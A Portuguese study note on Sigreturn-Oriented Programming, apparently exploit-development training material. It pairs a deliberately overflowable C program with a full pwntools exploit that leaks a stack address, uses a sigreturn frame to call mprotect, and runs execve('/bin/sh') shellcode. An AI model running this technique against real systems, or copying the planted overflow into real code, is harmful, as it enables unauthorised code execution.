# SROP

# Teoria
## Signals
## Sigreturn
## Sigreturn context

# Exemplo
## srop.c
- [amriunix](https://amriunix.com/post/sigreturn-oriented-programming-srop/)
- [0x00sec](https://0x00sec.org/t/srop-signals-you-say/2890)
- [pwntools SROP](https://docs.pwntools.com/en/dev/rop/srop.html)

```C
#include <stdio.h>
#include <stdlib.h>
// gcc srop.c -o srop -no-pie -fno-stack-protector
void syscall_(){
       __asm__("syscall; ret;");
}

void set_rax(){
       __asm__("movl $0xf, %eax; ret;");
}

int main(){
       // ONLY SROP!
       char buff[100];
       printf("Buff @%p, can you SROP?\n", buff);
       read(0, buff, 5000);
       return 0;
}
```

## Exploit
```py
#!/usr/bin/python3
from pwn import *


elf = context.binary = ELF("./srop")

io = process(elf.path)
io.recvuntil('@')

stack_leak = int(io.recv(14),16)
log.info("Got stack leak: " + hex(stack_leak))

io.recvuntil("?\n")

# Pular Func Prologo
elf.sym.syscall_ += 4
# pwndbg> disassemble syscall_ 
# Dump of assembler code for function syscall_:
#     0x0000000000401132 <+0>:	push   rbp
#     0x0000000000401133 <+1>:	mov    rbp,rsp
#     0x0000000000401136 <+4>:	syscall 
#     0x0000000000401138 <+6>:	ret    
#     0x0000000000401139 <+7>:	nop
#     0x000000000040113a <+8>:	pop    rbp
#     0x000000000040113b <+9>:	ret    

elf.sym.set_rax += 4 
# pwndbg> disassemble set_rax 
# Dump of assembler code for function set_rax:
#      0x000000000040113c <+0>:	push   rbp
#      0x000000000040113d <+1>:	mov    rbp,rsp
#      0x0000000000401140 <+4>:	mov    eax,0xf
#      0x0000000000401145 <+9>:	ret    
#      0x0000000000401146 <+10>:	nop
#      0x0000000000401147 <+11>:	pop    rbp
#      0x0000000000401148 <+12>:	ret    



payload = b""
payload += asm(shellcraft.execve("/bin/sh\x00"))
payload += b"A"*(120 - len(payload))
payload += p64(elf.sym.set_rax)
payload += p64(elf.sym.syscall_)        # sigreturn syscall

frame = SigreturnFrame(arch="amd64")
frame.rax = 0xa                         # mprotect syscall
frame.rdi = (stack_leak >> 12) << 12    # Addr
frame.rsi = 0x21000                     # Size
frame.rdx = 7                           # Perms
frame.rip = elf.sym.syscall_            # syscall (mrprotect); Ret
frame.rsp = stack_leak + len(payload) + len(frame) # ret addr
                                        #              \\  
payload += bytes(frame)                 #              \\
payload += p64(stack_leak)              #   <------------
                                        #
                                        # stack_leak ---> shellcode


io.sendline(payload)
io.interactive()
```